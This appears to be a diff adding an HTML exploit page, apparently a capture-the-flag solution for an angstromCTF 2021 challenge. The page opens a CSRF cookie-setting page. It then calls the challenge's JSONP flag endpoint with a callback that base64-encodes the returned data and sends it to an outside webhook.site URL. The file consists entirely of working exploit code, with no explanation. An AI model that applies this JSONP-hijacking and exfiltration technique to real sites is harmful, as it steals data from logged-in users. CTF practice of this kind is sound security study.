@@ -1,0 +1,22 @@
+<html>
+    <head>
+        <title>
+            INTENDED
+        </title>
+        <meta name="referrer" content="no-referrer">
+    </head>
+    <body>
+    <script>
+            function load (data) {
+                var x = data.items.map(i => ` ${i} `).join('')
+                var y = btoa(x)
+                window.open("https://webhook.site/4936b7f9-93a9-4c62-9239-3125cccdc0f7/?flag="+y);
+            }
+
+            window.open("/csrf_to_setcookie.html");
+    </script>   
+    <script src="https://jason.2021.chall.actf.co/flag?callback=load"></script>
+    </body>
+</html>
+
+<!-- index.html -->
